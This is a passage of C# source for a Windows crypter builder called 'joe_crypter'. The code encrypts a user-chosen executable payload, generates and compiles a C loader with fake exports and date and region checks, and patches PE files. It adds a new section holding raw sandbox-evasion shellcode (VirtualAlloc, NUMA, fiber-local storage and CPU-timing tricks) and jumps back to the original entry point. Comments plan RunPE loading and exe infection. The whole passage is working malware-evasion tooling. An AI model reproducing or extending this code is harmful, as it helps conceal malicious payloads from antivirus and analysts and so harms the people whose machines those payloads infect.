                sw.WriteLine("date_specific_check(\"" + dtp.Value.ToShortDateString() + "\");");
            }
            if (cbRegionSpecific.Checked)
            {
                sw.WriteLine("region_specific_check(\"" + cbRegion.SelectedText + "\");");
            }

            sw.Close(); fs.Close();

            if (cbFakeExports.Checked)
            {

                string[] datatype, returntype;

                Random rand = new Random();

                int x = rand.Next(1, 9); // random number of exports
                for (int y = 0; y <= x; y++)
                {

                    string randofuncname = RandomStringJustChars(rand.Next(5, 15));
                    string randomargumentname = RandomStringJustChars(rand.Next(5, 15));
                    datatype = new string[5] { "int", "char*", "float", "double", "long" };
                    returntype = new string[5] { "int", "char*", "float", "double", "long" };
                    int q = rand.Next(0, 99999); // q is datatype
                    int r = rand.Next(1, 5); // r is data type or function arguments
                    int s = rand.Next(1, 5); // s is return type
                    string text = File.ReadAllText("builder\\joe_crypter.c");


                    text = text.Replace("//replaceatbeginning" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ");");


                    if (returntype[s] == "char*")
                    {
                        text = text.Replace("//replacemeatend" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ")" + "\r\n { " +
                            "\r\n \r\n __asm{ \r\n jmp eax \r\n } \r\n" +
                            "return \"" + RandomStringJustChars(rand.Next(5, 15)) + "\"; \r\n }\r\n //");

                    }
                    else
                    {
                        text = text.Replace("//replacemeatend" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ")" + "\r\n { \r\n" +
                            "\r\n \r\n __asm{ \r\n jmp ebx \r\n } \r\n" + "return " + q + "; \r\n }\r\n //");

                    }
                    File.WriteAllText("builder\\joe_crypter.c", text);


                }

            }


        }
    
        private static void MakeLoader() 
        {
            // first cc, then rc, then link

            // L"pocc.exe -std:C11 -Tx86-coff -Ot -Ob1 -fp:precise -W1 -Gz -Ze \"G:\\C Projects\\joe_crypter\\joe_crypter.c\" -Fo\"G:\\C Projects\\joe_crypter\\output\\joe_crypter.obj\""
            // L"polink.exe -subsystem:windows -machine:x86 -largeaddressaware -base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib winmm.lib oleaut32.lib ole32.lib wbemuuid.lib Advapi32.lib -out:\"G:\\C Projects\\joe_crypter\\joe_crypter.exe\" \"G:\\C Projects\\joe_crypter\\output\\joe_crypter.obj\" \"G:\\C Projects\\joe_crypter\\output\\payload.res\""
            // this should be done AFTER the exe has been modified by our other options
            // aka compile time
            // make loader

            string compilerexe  = "pocc.exe";
            string rsrcexe      = "porc.exe";
            string linkexe      = "polink.exe";


            string sourcepath = Application.StartupPath + "\\builder\\joe_crypter.c";
            string objpath = Application.StartupPath + "\\builder\\joe_crypter.obj";
            // string payloadpath = Application.StartupPath + "\\builder\\res\\pload.joe";
            // see \builder\payload.r, points to \\res\\payload.joe
            string rsrs1 = Application.StartupPath + "\\builder\\payload.rc";
            string rsrs2 = Application.StartupPath + "\\builder\\payload.res";
            string finalexe = Application.StartupPath + "\\output_dir\\gogopowerrangers.exe";
			
			
            StreamWriter sw = new StreamWriter(Application.StartupPath + "\\builder\\buildit.bat");
            sw.WriteLine("@echo off");
            sw.WriteLine("color 17");
            sw.WriteLine("set PellesCDir=" + Application.StartupPath + "\\compiler");
            sw.WriteLine("set PATH=%PellesCDir%\\Bin;%PATH%");
            sw.WriteLine("set INCLUDE=%PellesCDir%\\Include;%PellesCDir%\\Include\\Win;%INCLUDE%");
            sw.WriteLine("set LIB=%PellesCDir%\\Lib;%PellesCDir%\\Lib\\Win;%LIB%");

            // compile -std:C11 -Tx86-coff -Os -Ox -Ob0 -fp:precise -W0 -Gz -Ze
            sw.WriteLine(compilerexe + " -std:C11 -Tx86-coff -Os -Ox -Ob0 -fp:precise -W0 -Gz -Ze \"" + sourcepath + "\" -Fo\"" + objpath + "\""); // changed to no warnings. smaller code
			// resources
            sw.WriteLine(rsrcexe + " \"" + rsrs1 + "\" -Fo\"" + rsrs2 + "\"");
			// link
            sw.WriteLine(linkexe + " -subsystem:windows -machine:X86 -largeaddressaware " +
                "-base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib Rpcrt4.lib " +
                "winmm.lib oleaut32.lib ole32.lib wbemuuid.lib Advapi32.lib -out:\"" + finalexe + "\" \"" + objpath + "\" \"" + rsrs2 + "\"");
            sw.WriteLine("\r\n");
            /*
            sw.WriteLine(":::       _             _____                  _            ");
            sw.WriteLine(":::      | |           / ____|                | |           ");
            sw.WriteLine(":::      | | ___   ___| |     _ __ _   _ _ __ | |_ ___ _ __ ");
            sw.WriteLine(":::  _   | |/ _\\ / _\\ |    | '__| | | | '_\\| __/ _\\ '__|");
            sw.WriteLine("::: | |__| | (_) |  __/ |____| |  | |_| | |_) | ||  __/ |   ");
            sw.WriteLine("::: \\____/\\___/\\___|\\____|_|  \\__, | .__/\\_\\___|_|   ");
            sw.WriteLine(":::                                 __/ | |                 ");
            sw.WriteLine(":::                                |___/|_|                 ");
            sw.WriteLine(":::                                                         ");
            sw.WriteLine("for /f \"delims =: tokens = *\" %%A in ('findstr /b ::: \" % ~f0\"') do @echo(%%A");
            */
            sw.WriteLine("echo Payload sucessfully built and saved to " + finalexe);
            sw.WriteLine("pause");
			
			
			
			
            sw.Close();

            // run it
            System.Diagnostics.Process batfile = new System.Diagnostics.Process();
            batfile.StartInfo.FileName = Application.StartupPath + "\\builder\\buildit.bat";

            //batfile.StartInfo.CreateNoWindow = true;
            //batfile.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            batfile.Start();

            
        }
       
       
        UInt32 RvaToOffsetJoe(PeHeaderReader lolpe, UInt32 Rva)
        {
		int o;
		int secx = lolpe.FileHeader.NumberOfSections;
			for(o=0;o<secx;o++)
			{
			if (Rva >= lolpe.ImageSectionHeaders[o].VirtualAddress && Rva < lolpe.ImageSectionHeaders[o].VirtualAddress + Math.Max(lolpe.ImageSectionHeaders[o].VirtualSize, lolpe.ImageSectionHeaders[o].SizeOfRawData))
				{
				
				return (UInt32)(Rva - lolpe.ImageSectionHeaders[o].VirtualAddress) + (lolpe.ImageSectionHeaders[o].PointerToRawData);
				}
					
			}
            throw new Exception("Failed to convert RVA");
		}

        private void AddToIAT(byte[] tricks, string path)
        {
          

            // idea.... what if I have a loader? My loader, an exe I make myself with nasm or whatever that does the stuff I want
            // evasions and whatnot, then used the runpe method on the second binary (of the user's choosing)? That way I dont have to mess
            // with the IAT of the target exe. I need only nasm.exe, the proper directives, my assembly code listings for each function.
            // I then have runpe run last. This way, I dont need to modify the EP of the program meaning it doesnt matter if the payload exe
            // is packed or whatever. Hell, I could even have the thing 

            // this code is best left to an exe infector in C#


            PeHeaderReader lolpe = new PeHeaderReader(this.tbfilehere.Text);
            
            UInt32 ImportDirectoryRVA = lolpe.OptionalHeader32.ImportTable.VirtualAddress; // RVA

            // https://github.com/Openwinrt/runtime/blob/8fcc079c283757c968dccf0fe6ae89ac351dcb86/mcs/class/IKVM.Reflection/Writer/TextSection.cs
            // http://www.ntcore.com/files/inject2exe.htm#AddnewsectionandChangeOEP4
            FileStream fs = new FileStream(path, FileMode.Open);
            BinaryWriter bw = new BinaryWriter(fs);
            BinaryReader br = new BinaryReader(fs);
            fs.Seek(0x3c, SeekOrigin.Begin); // go to the value of e_lfanew
            int my_e_lfanew = br.ReadInt32();
            UInt32 joe = RvaToOffsetJoe(lolpe, ImportDirectoryRVA) + (UInt32)my_e_lfanew;

           

            // try seeking to the imports area first dumbass or better yet, importdirectoryVA + the length of the last entry (lolpe.OptionalHeader32.ImportTable.Size;)

            fs.Seek(RvaToOffsetJoe(lolpe, ImportDirectoryRVA), SeekOrigin.Begin); // kek oops
            bw.Write(ImportDirectoryRVA + 40);
            bw.Write(0);
            bw.Write(0);
            bw.Write(ImportHintNameTableRVA(lolpe) + 14);
            bw.Write(ImportDirectoryRVA);
            bw.Write(new byte[20]); 
            bw.Write(ImportHintNameTableRVA(lolpe));
            int size = 48;
            if (lolpe.FileHeader.Machine != 0x014C) // if not 32 bit
            {
                size += 4;
                bw.Write(0);
            }
            bw.Write(0);

            for (int i = (int)(ImportHintNameTableRVA(lolpe) - (ImportDirectoryRVA + size)); i > 0; i--)
            {
                bw.Write((byte)0);
            }

            //AssertRVA(fs, ImportHintNameTableRVA(lolpe), lolpe);
            bw.Write((ushort)0);
            bw.Write(System.Text.Encoding.ASCII.GetBytes("FatalAppExitA"));
            bw.Write(0);
            bw.Write(System.Text.Encoding.ASCII.GetBytes("kernel32.dll"));
            bw.Write((ushort)0);
            fs.Close();
            MessageBox.Show("AYYY LMAO");
            
          // try PEReader library instead

        }
        private byte[] ProcMemInfoTrick()
        {

            byte[] ProcMemInfoStuff = { 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x28, 0x68, 0x15, 0x30, 0x40, 0x00, 0xFF, 0x15, 0x94, 0x40, 
                                        0x40, 0x00, 0x68, 0x00, 0x30, 0x40, 0x00, 0x50, 0xFF, 0x15, 0x98, 0x40, 0x40, 0x00, 0xA3,
                                        0x60, 0x45, 0x40, 0x00, 0xFF, 0x15, 0x9C, 0x40, 0x40, 0x00, 0x6A, 0x28, 0x8D, 0x55, 0xD8, 
                                        0x52, 0x50, 0xFF, 0x15, 0x60, 0x45, 0x40, 0x00, 0x83, 0xC4, 0x0C, 0x81, 0x7D, 0xE4, 0x15, 
                                        0xBF, 0x34, 0x00, 0x77, 0x04, 0x31, 0xC0, 0xEB, 0x09, 0x6A, 0x00, 0xE8, 0x54, 0x30, 0x00, 
                                        0x00, 0x31, 0xC0, 0x89, 0xEC, 0x5D, 0xC3 };
            return ProcMemInfoStuff;
        }
        private byte[] AllocTrick()
        {
            byte[] VirtualAllocTrick = { 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x08, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x53,
                                         0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x68, 0x00, 0x00, 0xE0, 0x15, 0x6A, 0x00, 0xFF, 
                                         0x15, 0x94, 0x40, 0x40, 0x00, 0x89, 0x45, 0xF8, 0x68, 0x00, 0x00, 0xE0, 0x15, 0xB8, 0xCC,
                                         0x00, 0x00, 0x00, 0x0F, 0xB6, 0xC0, 0x50, 0x8B, 0x45, 0xF8, 0x50, 0xE8, 0x34, 0x00, 0x00,
                                         0x00, 0x83, 0xC4, 0x0C, 0x68, 0xB8, 0x0B, 0x00, 0x00, 0xFF, 0x15, 0x98, 0x40, 0x40, 0x00,
                                         0x68, 0x00, 0xC0, 0x00, 0x00, 0x68, 0x00, 0x00, 0xE0, 0x15, 0x8B, 0x45, 0xF8, 0x50, 0xFF,
                                         0x15, 0x9C, 0x40, 0x40, 0x00, 0xFF, 0x45, 0xFC, 0x83, 0x7D, 0xFC, 0x04, 0x7C, 0xA7, 0xB8,
                                         0x00, 0x00, 0x00, 0x00, 0x89, 0xEC, 0x5D, 0xC3, 0x55, 0x89, 0xE5, 0x51, 0x57, 0x8A, 0x45,
                                         0x0C, 0x8B, 0x4D, 0x10, 0x8B, 0x7D, 0x08, 0xF3, 0xAA, 0x5F, 0x59, 0x8B, 0x45, 0x08, 0x89,
                                         0xEC, 0x5D, 0xC3 };
            return VirtualAllocTrick;
        }
        private byte[] FakeWindow()
        {
            
            // Fake window is a call to CreateWindow with a size of 0
            // so CreateWindowExA from user32.dll
            // so GetProcAddress + loadLibrary on user32.dll + CreateWindow call
            // so CreateWindowExA(0x00000200,"notepad","notepad",0x00800000,CW_USEDEFAULT, CW_USEDEFAULT,0,0,NULL,NULL,NULL);
            byte[] CreateInvisWindowAsm = { 0x68, 0x18, 0x30, 0x40, 0x00, 0xFF, 0x15, 0x94, 0x40, 0x40, 0x00, 0x68, 0x08, 0x30, 0x40, 0x00, 0x50, 0xFF, 
              0x15, 0x98, 0x40, 0x40, 0x00, 0xA3, 0x60, 0x45, 0x40, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68, 
              0x00, 0x00, 0x00, 0x80, 0x68, 0x00, 0x00, 0x00, 0x80, 0x68, 0x00, 0x00, 0x80, 0x00, 0x68, 0x00, 0x30, 0x40, 0x00, 0x68, 0x00, 0x30, 0x40, 
              0x00, 0x68, 0x00, 0x02, 0x00, 0x00, 0xFF, 0x15, 0x60, 0x45, 0x40, 0x00, 0x83, 0xC4, 0x30, 0x31, 0xC0, 0xC3 };
            
            return CreateInvisWindowAsm;

        }

        private byte[] NumaTrick()
        {
            byte[] NumaOne = { 0x55, 0x89, 0xE5, 0xFF, 0x15, 0x90, 0x40, 0x40, 0x00, 0x6A, 0x00, 0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x68, 0xE8,
                               0x03, 0x00, 0x00, 0x6A, 0x00, 0x50, 0xFF, 0x15, 0x94, 0x40, 0x40, 0x00, 0x85, 0xC0, 0x74, 0x04, 0x31, 0xC0, 0xEB, 0x09,
                               0x6A, 0x00, 0xE8, 0x69, 0x30, 0x00, 0x00, 0x31, 0xC0, 0x89, 0xEC, 0x5D, 0xC3 };
            return NumaOne;

        }

        private byte[] FLSTrick()
        {
            byte[] FiberTrick = { 0x55, 0x89, 0xE5, 0x6A, 0x00, 0xFF, 0x15, 0x90, 0x40, 0x40, 0x00, 0x83, 0xF8, 0xFF, 0x74, 0x04, 0x31, 0xC0, 0xEB, 0x09,
                                  0x6A, 0x00, 0xE8, 0x79, 0x30, 0x00, 0x00, 0x31, 0xC0, 0x89, 0xEC, 0x5D, 0xC3 };
            return FiberTrick;
        }
        private byte[] JoeTrix()
        {
            byte[] FiberTrick = { 0x55, 0x89, 0xE5, 0x6A, 0x00, 0xFF, 0x15, 0x90, 0x40, 0x40, 0x00, 0x83, 0xF8, 0xFF, 0x74, 0x04, 0x31, 0xC0, 0xEB, 0x09,
                                  0x6A, 0x00, 0xE8, 0x79, 0x30, 0x00, 0x00, 0x31, 0xC0, 0x89, 0xEC, 0x5D, 0xC3 };
            return FiberTrick;
        }
        private byte[] NOPPER()
        {
            byte[] NOPPER = { 0x90 };
            return NOPPER;
        }

        private byte[] CPUTimeTrick() // borked
        {
            byte[] CPUTimeTrickery = { 0x55, 0x89, 0xE5, 0x53, 0x68, 0x0C, 0x30, 0x40, 0x00, 0xFF, 0x15, 0x98, 0x40, 0x40, 0x00, 0x68, 0x00, 0x30, 0x40, 
                                       0x00, 0x50, 0xFF, 0x15, 0x9C, 0x40, 0x40, 0x00, 0xA3, 0x70, 0x45, 0x40, 0x00, 0xFF, 0x15, 0x70, 0x45, 0x40, 0x00,
                                       0x89, 0xC3, 0x68, 0xE8, 0x03, 0x00, 0x00, 0xFF, 0x15, 0xA0, 0x40, 0x40, 0x00, 0xFF, 0x15, 0x70, 0x45, 0x40, 0x00,
                                       0x8D, 0x93, 0xE8, 0x03, 0x00, 0x00, 0x39, 0xD0, 0x76, 0x0E, 0x81, 0xC3, 0xED, 0x03, 0x00, 0x00, 0x39, 0xD8, 0x73,
                                       0x04, 0x31, 0xC0, 0xEB, 0x09, 0x6A, 0x00, 0xE8, 0x4C, 0x30, 0x00, 0x00, 0x31, 0xC0, 0x5B, 0x89, 0xEC, 0x5D, 0xC3};
            return CPUTimeTrickery;
        }

        private UInt32 GetExeEPOnDisk(string path) // EpOnDisk useful for fillsection
        {
            PeHeaderReader lolpe = new PeHeaderReader(path);
            
            UInt32 epondisk = (lolpe.OptionalHeader32.AddressOfEntryPoint - lolpe.OptionalHeader32.BaseOfCode) + (lolpe.ImageSectionHeaders[0].PointerToRawData + lolpe.OptionalHeader32.FileAlignment);
            //EP (File) = AddressOfEntryPoint – BaseOfCode + .text[PointerToRawData] + FileAlignment


           
            MessageBox.Show(epondisk.ToString("X"));
            // .text[ Entry point - Virtual offset ] + File Alignment = Raw entry point (relative to .text section)
            return epondisk;

            // final step 
            // save first 5 bytes of the EP, perform a long jmp to it, jump back to it when done? or maybe restore the bytes?

        }
        UInt32 round_up(UInt32 x, UInt32 y)
        {
        return (x + y - 1) & ~(y - 1);
        }
        private void CreateSection(string path)
        { 
            // bug
            // if theres no room (raw address is less than 400) then theres no room to write the section header.
            PeHeaderReader lolpe = new PeHeaderReader(path);
            // first create an additional section by adding +1 to FileHeader.NumberOfSections which is 7 bytes from E_LFANEW
            FileStream fs = new FileStream(path, FileMode.Open);
            BinaryReader br = new BinaryReader(fs);
            BinaryWriter bw = new BinaryWriter(fs);
            fs.Seek(0x3c, SeekOrigin.Begin); 
            int my_e_lfanew = br.ReadInt32();
            fs.Seek(my_e_lfanew + 6, SeekOrigin.Begin); // go to the value of e_lfanew + 7 (FileHeader.NumberOfSections)
            short numberofsections = br.ReadInt16(); ; // get number of sections, add 1 to it, write it.//lolpe.FileHeader.NumberOfSections;
            fs.Seek(my_e_lfanew + 6, SeekOrigin.Begin);
            numberofsections++;
            bw.Write(numberofsections);

            // now we need to write the other data like virtual size, etc. 
            // each section defined is 40 bytes in length, so....skip numberofsections_old * 40 or numberofsections*40-40
            // after the seek to Numberofsections, we need to seek back to the start of the sections code right? So....E_LFANEW + 248
            fs.Seek(my_e_lfanew + 248 + (40 * numberofsections) - 40, SeekOrigin.Begin);

            UInt32 VirtualSz = 0x1000;
            UInt32 VA = lolpe.ImageSectionHeaders[numberofsections - 2].VirtualAddress + round_up(lolpe.ImageSectionHeaders[numberofsections - 2].VirtualSize, lolpe.OptionalHeader32.SectionAlignment);
            UInt32 RawSize = 0x1000;
            UInt32 RawAddress = lolpe.ImageSectionHeaders[numberofsections - 2].PointerToRawData + lolpe.ImageSectionHeaders[numberofsections - 2].SizeOfRawData;
            UInt32 RelocAddr = 0;
            UInt32 LineNo = 0;
            UInt16 ReloNum = 0;
            UInt16 LineNo2 = 0;
            UInt32 characteristics = 0x60000020;
            byte[] NewSectionName2 = Encoding.ASCII.GetBytes(".joe");
            // total length should be 40 bytes

            bw.Write(NewSectionName2); // 4 bytes
            fs.Seek(4, SeekOrigin.Current); // skip 4 bytes to next part
            bw.Write(VirtualSz); // 4 bytes
            bw.Write(VA); // 4 bytes 
            bw.Write(RawSize); // 4 bytes
            bw.Write(RawAddress); //4 bytes
            bw.Write(RelocAddr); // 4 bytes
            bw.Write(LineNo); // 4 bytes
            bw.Write(ReloNum); // 2 bytes
            bw.Write(LineNo2); // 2 bytes
            bw.Write(characteristics); // 4 bytes

            // Finally adjust the OptionalHeader.SizeOfImage field which is 80 bytes from the value in E_LFANEW
            fs.Seek(my_e_lfanew + 80, SeekOrigin.Begin);
            UInt32 new_Sizeofimage = VA + round_up(VirtualSz, lolpe.OptionalHeader32.SectionAlignment);
            bw.Write(new_Sizeofimage);
            long diff = new_Sizeofimage - fs.Length;
            fs.Seek(0, SeekOrigin.End);
            // write crap to end of file the length of diff so new_SizeofImage is consistant
            byte[] extracrapatend = new byte[diff]; 
            // fill memory
            for (int x = 0; x < extracrapatend.Length; x++)
            {
                extracrapatend[x] = 0x00;
            }
            // add to end
            bw.Write(extracrapatend);
            // cleanup
            bw.Close();  br.Close();  fs.Close();
        }

        private void FillNewSection(string path, int selected_trick)
        {
            CreateSection(tbfilehere.Text);
            PeHeaderReader lolpe = new PeHeaderReader(path);
            FileStream fs = new FileStream(path, FileMode.Open);
            BinaryReader br = new BinaryReader(fs);
            BinaryWriter bw = new BinaryWriter(fs);
            ushort numsect = lolpe.FileHeader.NumberOfSections;
            UInt32 writehere = lolpe.ImageSectionHeaders[numsect +1].PointerToRawData;
            fs.Seek(writehere, SeekOrigin.Begin);
            switch (selected_trick)
            {

                case 1:
                    bw.Write(ProcMemInfoTrick());
                    break;
                case 2:
                    bw.Write(AllocTrick());
                    break;
                case 3:
                    bw.Write(FakeWindow());
                    break;
                case 4:
                    bw.Write(NumaTrick());
                    break;
                case 5:
                    bw.Write(FLSTrick());
                    break;
                case 6:
                    bw.Write(CPUTimeTrick());
                    break;
                case 7:
                    bw.Write(JoeTrix());
                    for (int x = 0; x < lolpe.ImageSectionHeaders[numsect +1].SizeOfRawData - JoeTrix().Length - 6; x++)
                    {
                        bw.Write(NOPPER());
                    }
                    break;
                
            }
            // need to write jmp back to main EP, I'm using push ret
            
            UInt32 fuck = lolpe.OptionalHeader32.AddressOfEntryPoint + lolpe.OptionalHeader32.ImageBase;
            byte[] jumpindeline = { 0x68 }; // 1 byte
            byte[] ret = { 0xc3 }; // 1 byte
            byte[] shit = new byte[3]; // 4 bytes
            shit = BitConverter.GetBytes(fuck);
            byte[] ass = new byte[6]; // 6 bytes

            Array.Copy(jumpindeline, 0, ass, 0, 1);
            Array.Copy(shit, 0, ass, 1, 4);
            Array.Copy(ret, 0, ass, 5, 1);

            bw.Write(ass);

            bw.Close(); br.Close(); fs.Close();


            
        }
        private void FormMain_Load(object sender, EventArgs e)
        {
            FormMain.CheckForIllegalCrossThreadCalls = false;
            rbUnpackMeth1.Checked = true;
            //lbRegion.SelectedItem = 7;
            dtp.Value = dtp.Value.AddDays(7);
            WMPLib.WindowsMediaPlayer player = new WMPLib.WindowsMediaPlayer();
            // WMPLib.IWMPPlaylist pl = null;
            // pl = player.newPlaylist("kek", Application.StartupPath);
            // pl.appendItem(player.newMedia(Application.StartupPath + "\\ayy.mp3"));
            // pl.appendItem(player.newMedia(Application.StartupPath + "\\vvvvvv.mp3"));
            // player.currentPlaylist = pl;
            if (devmode == false)
            {
                player.settings.setMode("loop", true);
                player.URL = Application.StartupPath + "\\tekilla_remix.mp3";
                player.controls.play();
            }
            // CEXE - http://www.scottlu.com/Content/CExe.html
            // kkrunchy - http://www.farbrausch.de/~fg/kkrunchy/
            // PE Spin http://pespin.w.interia.pl/
            // RLPack http://www.softpedia.com/get/Programming/Packers-Crypters-Protectors/RLPack-Basic-Edition.shtml
            // MPRESS http://www.matcode.com/mpress.htm
            // XPACK - http://soft-lab.de/JoKo/
            // MEW - http://web.archive.org/web/20070831063728/http://northfox.uw.hu/index.php?lang=eng&id=dev

            //for the compiler to work, we need to have both the xml file and the environment variables set as well
            
            // create batch file
            // what if i create a batch file for compilation and include the set variables in there???
            
            if (Environment.GetEnvironmentVariable("PellesCDir") == null)
            {
                // FUCK
                

                StreamWriter sw = new StreamWriter(Application.StartupPath + "\\compiler\\bin\\env.bat");
                sw.WriteLine("@echo off");
                sw.WriteLine("set PellesCDir=" + Application.StartupPath + "\\compiler");
                sw.WriteLine("set PATH=%PellesCDir%\\Bin;%PATH%");
                sw.WriteLine("set INCLUDE=%PellesCDir%\\Include;%PellesCDir%\\Include\\Win;%INCLUDE%");
                sw.WriteLine("set LIB=%PellesCDir%\\Lib;%PellesCDir%\\Lib\\Win;%LIB%");
                sw.Close();

                // run it
                ProcessStartInfo batfile = new ProcessStartInfo(Application.StartupPath + "\\compiler\\bin\\env.bat");
                batfile.CreateNoWindow = true;
                batfile.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(batfile);
            }
            


        }


       public void encryptpayload(string filename) // encryted by random key, set at startup.
        {
            Encoding ascii = Encoding.ASCII;
            Random ran = new Random();
            int keykey = ran.Next(10000,99999);
            byte[] newfile = File.ReadAllBytes(filename);
            byte[] resultBuffer = new byte[newfile.Length];
            for (int i = 0; i < newfile.Length; i++)
            {
                resultBuffer[i] = (byte)(newfile[i] ^ keykey);
            }

            File.WriteAllBytes(Application.StartupPath + "\\builder\\res\\pload.joe", resultBuffer);
            payloadcryptkey = keykey;

        }
        public static void B64_payload(string filename)
        {
            byte[] filebuff = File.ReadAllBytes(filename);
            string payload = Convert.ToBase64String(filebuff);
            File.WriteAllText(Application.StartupPath + "\\builder\\res\\pload.joe", payload);
            File.Delete(Application.StartupPath + "\\builder\\res\\tempload.joe");
            
        }

        private void loadExeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string filename = ofd.FileName;

                tbfilehere.Text = filename;

            }
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AboutForm af = new AboutForm();
            af.Show();
        }

        private void debugToolStripMenuItem_Click(object sender, EventArgs e)
        {
            

        }

        private void turnOffMusicToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WMPLib.WindowsMediaPlayer player = new WMPLib.WindowsMediaPlayer();
            player.controls.stop();
           
        }

        private void seriouslyHelpToolStripMenuItem_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://gironsec.com/blog");
        }

        private void randcharsfordecryption(int which)
        {
            switch (which)
            {
                case 1:
                    break;
                case 2:
                    break;
            }

            Random rnd = new Random();
            string text = File.ReadAllText("test.txt");
            text = text.Replace("__randval__", rnd.Next(1, 255).ToString());
            File.WriteAllText("test.txt", text);
        }
    }
}
